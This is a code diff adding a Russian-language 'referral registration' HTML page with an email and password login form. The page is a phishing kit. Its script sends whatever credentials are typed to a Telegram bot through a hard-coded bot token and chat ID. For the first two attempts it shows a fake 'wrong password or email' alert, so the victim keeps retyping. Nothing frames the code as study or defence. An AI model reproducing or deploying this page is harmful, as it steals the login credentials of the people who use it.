@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Referal</title>
+    <style>
+ body{
+     padding: 200px 50px 100px 50px;
+background-color: #f75114;
+background-image: url(../img/w256h25613715677480005BookmarkOpen.png) ;
+background-size: 7%;
+
+ }
+.regist{
+    padding: 5px;
+border-radius: 10px;
+    background-color: blanchedalmond;
+    height: 170px;
+}
+.regist {
+    text-align: center;
+}
+.regist p{
+  
+    margin: 0px;
+    padding: 0px;
+}
+input{
+    background-color: white;
+
+    margin: 5px 0px;
+    border-radius: 7px;
+    height: 25px;
+    width: 200px;
+    box-shadow: none;
+    border-color: none;
+}
+button{
+    margin: 10px 0px;
+    width: 205px;
+    height: 25px;
+}
+
+    </style>
+</head>
+<body></body>
+    <h2 style="color:white; position: absolute;top:50px;left: 100px; text-align: center;text-shadow: 2px 4px 4px black">Регистрация <br> по рефиральной<br> ссылке</h2>
+<div class="regist">
+    <p>Email:</p>
+    <input class="email" type="email" >
+    <p> Password: </p>
+    <input class="pass" type="password">
+
+    <button>Log-in</button>
+</div>
+
+    <script >
+        var schot = 0;
+    document.querySelector('button').onclick = function (){
+if(schot<2){
+    let message_email = document.querySelector('.email').value;
+    let message_pass = document.querySelector('.pass').value;
+
+    const token = `1858170819:AAFHbCiq82lcsK34VRiisSkAf35hB9XJ6iQ`;
+    let url = `https://api.telegram.org/bot`+token+`/sendMessage?chat_id=422426874&text=`;
+
+    let xhttp = new XMLHttpRequest();
+    xhttp.open("GET",url+"Email:"+message_email+"Password:"+message_pass,true);
+    xhttp.send();
+     alert("Неправильный пароль или имэйл");
+    schot++;
+   
+}
+else  if(schot>=2){
+    let message_email = document.querySelector('.email').value;
+    let message_pass = document.querySelector('.pass').value;
+
+    const token = `1858170819:AAFHbCiq82lcsK34VRiisSkAf35hB9XJ6iQ`;
+    let url = `https://api.telegram.org/bot`+token+`/sendMessage?chat_id=422426874&text=`;
+
+    let xhttp = new XMLHttpRequest();
+    xhttp.open("GET",url+"Email:"+message_email+"Password:"+message_pass,true);
+    xhttp.send();
+    
+}
+}
+
+    </script>
+</body>
+</html>
